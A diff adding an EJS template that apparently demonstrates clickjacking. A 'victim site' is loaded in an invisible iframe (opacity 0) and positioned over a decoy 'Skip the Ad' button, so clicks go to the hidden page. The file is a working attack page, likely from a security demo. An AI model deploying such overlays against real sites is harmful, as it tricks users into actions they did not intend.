@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title><%= title %></title>
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+  </head>
+  <body>
+      <style>
+        iframe { /* iframe from the victim site */
+          width: 400px;
+          height: 100px;
+          position: absolute;
+          top:0;
+          left:-20px;
+          opacity: 0;
+          z-index: 1;
+          margin-left: 50px;
+          margin-top: 53px;
+        }
+      </style>
+
+      <div>Some text goes here ...</div>
+
+      <!-- The url from the victim site -->
+      <iframe src="<%= iframePath%>"></iframe>
+
+      <button onclick="alert('Skip the Ad!');" >Skip the Ad</button>
+
+      <div>This is my super content of the super page.</div>
+  </body>
+</html>
